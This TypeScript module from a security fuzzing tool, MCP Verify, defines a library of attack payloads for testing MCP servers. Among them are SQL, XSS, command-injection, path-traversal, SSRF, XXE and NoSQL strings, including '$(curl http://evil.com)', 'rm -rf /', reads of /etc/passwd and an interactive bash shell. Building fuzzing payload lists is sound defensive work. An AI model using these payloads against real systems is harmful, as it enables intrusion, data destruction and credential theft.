/**
 * Copyright (c) 2026 FinkTech
 *
 * This file is part of MCP Verify.
 * Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
 * See LICENSE file in the project root for full license information.
 */
/**
 * Attack Payloads Library for Security Fuzzing
 *
 * Comprehensive collection of attack vectors for testing MCP servers
 * against common vulnerabilities.
 *
 * Categories:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - Command Injection
 * - Path Traversal
 * - SSRF (Server-Side Request Forgery)
 * - XXE (XML External Entity)
 * - Buffer Overflow
 * - Format String
 * - LDAP Injection
 * - NoSQL Injection
 *
 * @module libs/core/use-cases/fuzzer/payloads
 */

export interface AttackPayload {
  value: string;
  type: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  expectedBehavior?: string;
}

export const ATTACK_PAYLOADS = {
  /**
   * SQL Injection Payloads
   * Target: Parameters used in SQL queries
   */
  sqli: [
    {
      value: "' OR '1'='1",
      type: 'sqli',
      severity: 'critical' as const,
      description: 'payload_sqli_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "'; DROP TABLE users--",
      type: 'sqli',
      severity: 'critical' as const,
      description: 'payload_sqli_delete_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "1' UNION SELECT NULL--",
      type: 'sqli',
      severity: 'critical' as const,
      description: 'payload_sqli_union_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "admin'--",
      type: 'sqli',
      severity: 'high' as const,
      description: 'Comment-based SQL injection bypass',
      expectedBehavior: 'Should not bypass authentication'
    },
    {
      value: "1' AND 1=1--",
      type: 'sqli',
      severity: 'high' as const,
      description: 'Boolean-based blind SQL injection',
      expectedBehavior: 'Should not reveal timing differences'
    },
    {
      value: "1' WAITFOR DELAY '00:00:05'--",
      type: 'sqli',
      severity: 'high' as const,
      description: 'Time-based blind SQL injection (MSSQL)',
      expectedBehavior: 'Should not cause delays'
    },
    {
      value: "1' AND SLEEP(5)--",
      type: 'sqli',
      severity: 'high' as const,
      description: 'Time-based blind SQL injection (MySQL)',
      expectedBehavior: 'Should not cause delays'
    },
    {
      value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      type: 'sqli',
      severity: 'high' as const,
      description: 'Advanced time-based SQLi',
      expectedBehavior: 'Should not cause delays'
    }
  ],

  /**
   * Cross-Site Scripting (XSS) Payloads
   * Target: Parameters that might be rendered in HTML
   */
  xss: [
    {
      value: "<script>alert(1)</script>",
      type: 'xss',
      severity: 'high' as const,
      description: 'fuzz_xss_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "<img src=x onerror=alert(1)>",
      type: 'xss',
      severity: 'high' as const,
      description: 'fuzz_xss_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "javascript:alert(1)",
      type: 'xss',
      severity: 'high' as const,
      description: 'fuzz_xss_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "<svg/onload=alert(1)>",
      type: 'xss',
      severity: 'high' as const,
      description: 'fuzz_xss_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "<iframe src=javascript:alert(1)>",
      type: 'xss',
      severity: 'high' as const,
      description: 'fuzz_xss_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "<body onload=alert(1)>",
      type: 'xss',
      severity: 'medium' as const,
      description: 'fuzz_xss_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * Command Injection Payloads
   * Target: Parameters passed to system commands
   */
  cmdInjection: [
    {
      value: "; ls -la",
      type: 'cmdInjection',
      severity: 'critical' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "| whoami",
      type: 'cmdInjection',
      severity: 'critical' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "`cat /etc/passwd`",
      type: 'cmdInjection',
      severity: 'critical' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "$(curl http://evil.com)",
      type: 'cmdInjection',
      severity: 'critical' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "&& rm -rf /",
      type: 'cmdInjection',
      severity: 'critical' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "& echo vulnerable &",
      type: 'cmdInjection',
      severity: 'high' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "\n/bin/bash -i",
      type: 'cmdInjection',
      severity: 'critical' as const,
      description: 'fuzz_cmd_inj_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * Path Traversal Payloads
   * Target: File path parameters
   */
  pathTraversal: [
    {
      value: "../../../etc/passwd",
      type: 'pathTraversal',
      severity: 'critical' as const,
      description: 'fuzz_path_trav_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "..\\..\\..\\windows\\system32\\config\\sam",
      type: 'pathTraversal',
      severity: 'critical' as const,
      description: 'fuzz_path_trav_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "....//....//....//etc/passwd",
      type: 'pathTraversal',
      severity: 'high' as const,
      description: 'fuzz_path_trav_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      type: 'pathTraversal',
      severity: 'high' as const,
      description: 'fuzz_path_trav_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "..%252f..%252f..%252fetc/passwd",
      type: 'pathTraversal',
      severity: 'high' as const,
      description: 'fuzz_path_trav_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "/var/www/../../etc/passwd",
      type: 'pathTraversal',
      severity: 'high' as const,
      description: 'fuzz_path_trav_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "....//....//....//etc/passwd",
      type: 'pathTraversal',
      severity: 'critical' as const,
      description: 'Advanced regex bypass for path traversal',
      expectedBehavior: 'Should not allow access outside base directory'
    },
    {
      value: ".......//.......//.......//etc/passwd",
      type: 'pathTraversal',
      severity: 'critical' as const,
      description: 'Extended regex bypass for path traversal',
      expectedBehavior: 'Should not allow access outside base directory'
    },
    {
      value: "./....//./....//etc/passwd",
      type: 'pathTraversal',
      severity: 'high' as const,
      description: 'Obfuscated path traversal bypass',
      expectedBehavior: 'Should not allow access outside base directory'
    },
    {
      value: "....//package.json",
      type: 'pathTraversal',
      severity: 'critical' as const,
      description: 'Regex bypass targeting root package.json',
      expectedBehavior: 'Should not allow access to project configuration'
    },
    {
      value: "....//....//package.json",
      type: 'pathTraversal',
      severity: 'critical' as const,
      description: 'Deep regex bypass targeting root package.json',
      expectedBehavior: 'Should not allow access to project configuration'
    }
  ],

  /**
   * Server-Side Request Forgery (SSRF) Payloads
   * Target: URL parameters
   */
  ssrf: [
    {
      value: "http://localhost:22",
      type: 'ssrf',
      severity: 'high' as const,
      description: 'fuzz_ssrf_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "http://169.254.169.254/latest/meta-data/",
      type: 'ssrf',
      severity: 'critical' as const,
      description: 'fuzz_ssrf_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "http://127.0.0.1:6379/",
      type: 'ssrf',
      severity: 'high' as const,
      description: 'fuzz_ssrf_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "file:///etc/passwd",
      type: 'ssrf',
      severity: 'critical' as const,
      description: 'fuzz_ssrf_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "gopher://127.0.0.1:25/",
      type: 'ssrf',
      severity: 'high' as const,
      description: 'fuzz_ssrf_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "http://192.168.1.1/admin",
      type: 'ssrf',
      severity: 'high' as const,
      description: 'fuzz_ssrf_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * XML External Entity (XXE) Payloads
   * Target: XML input parameters
   */
  xxe: [
    {
      value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      type: 'xxe',
      severity: 'critical' as const,
      description: 'fuzz_xxe_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
      type: 'xxe',
      severity: 'critical' as const,
      description: 'fuzz_xxe_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>',
      type: 'xxe',
      severity: 'critical' as const,
      description: 'fuzz_xxe_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * Buffer Overflow Payloads
   * Target: Length-limited fields
   */
  overflow: [
    {
      value: "A".repeat(10000),
      type: 'overflow',
      severity: 'medium' as const,
      description: 'fuzz_overflow_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "A".repeat(100000),
      type: 'overflow',
      severity: 'high' as const,
      description: 'fuzz_overflow_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "\x00".repeat(1000),
      type: 'overflow',
      severity: 'medium' as const,
      description: 'fuzz_overflow_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * Format String Payloads
   * Target: String formatting functions
   */
  formatString: [
    {
      value: "%s%s%s%s%s%s",
      type: 'formatString',
      severity: 'high' as const,
      description: 'fuzz_format_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "%x%x%x%x",
      type: 'formatString',
      severity: 'high' as const,
      description: 'fuzz_format_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "%n%n%n%n",
      type: 'formatString',
      severity: 'critical' as const,
      description: 'fuzz_format_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * LDAP Injection Payloads
   * Target: LDAP query parameters
   */
  ldap: [
    {
      value: "*)(uid=*))(|(uid=*",
      type: 'ldap',
      severity: 'high' as const,
      description: 'fuzz_ldap_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "admin)(|(password=*",
      type: 'ldap',
      severity: 'high' as const,
      description: 'fuzz_ldap_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * NoSQL Injection Payloads
   * Target: NoSQL database queries (MongoDB, etc.)
   */
  nosql: [
    {
      value: '{"$ne": null}',
      type: 'nosql',
      severity: 'high' as const,
      description: 'fuzz_nosql_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: '{"$gt": ""}',
      type: 'nosql',
      severity: 'high' as const,
      description: 'fuzz_nosql_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: '"; return true; var dummy="',
      type: 'nosql',
      severity: 'critical' as const,
      description: 'fuzz_nosql_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * Template Injection Payloads
   * Target: Template engines
   */
  templateInjection: [
    {
      value: "{{7*7}}",
      type: 'templateInjection',
      severity: 'high' as const,
      description: 'fuzz_template_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "${7*7}",
      type: 'templateInjection',
      severity: 'high' as const,
      description: 'fuzz_template_desc',
      expectedBehavior: 'payload_expected_behavior'
    },
    {
      value: "{{config}}",
      type: 'templateInjection',
      severity: 'critical' as const,
      description: 'fuzz_template_desc',
      expectedBehavior: 'payload_expected_behavior'
    }
  ],

  /**
   * Object Key Injection / Prototype Pollution
   * Target: Parameters used as object keys
   */
  objectInjection: [
    {
      value: "__proto__",
      type: 'objectInjection',
      severity: 'high' as const,
      description: 'Prototype property injection',
      expectedBehavior: 'Should not allow access to object prototype'
    },
    {
      value: "constructor",
      type: 'objectInjection',
      severity: 'high' as const,
      description: 'Constructor property injection',
      expectedBehavior: 'Should not allow access to constructor'
    },
    {
      value: "toString",
      type: 'objectInjection',
      severity: 'medium' as const,
      description: 'Native method name injection',
      expectedBehavior: 'Should not match native methods as valid keys'
    },
    {
      value: "valueOf",
      type: 'objectInjection',
      severity: 'medium' as const,
      description: 'Native method name injection',
      expectedBehavior: 'Should not match native methods as valid keys'
    }
  ]
};

/**
 * Get all payloads as flat array
 */
export function getAllPayloads(): AttackPayload[] {
  return Object.values(ATTACK_PAYLOADS).flat();
}

/**
 * Get payloads by type
 */
export function getPayloadsByType(type: keyof typeof ATTACK_PAYLOADS): AttackPayload[] {
  return ATTACK_PAYLOADS[type] || [];
}

/**
 * Get payloads by severity
 */
export function getPayloadsBySeverity(severity: 'critical' | 'high' | 'medium' | 'low'): AttackPayload[] {
  return getAllPayloads().filter(p => p.severity === severity);
}

/**
 * Get random payload
 */
export function getRandomPayload(): AttackPayload {
  const all = getAllPayloads();
  return all[Math.floor(Math.random() * all.length)];
}

/**
 * Get random payloads of specific type
 */
export function getRandomPayloads(count: number, type?: keyof typeof ATTACK_PAYLOADS): AttackPayload[] {
  const source = type ? getPayloadsByType(type) : getAllPayloads();
  const shuffled = [...source].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, count);
}
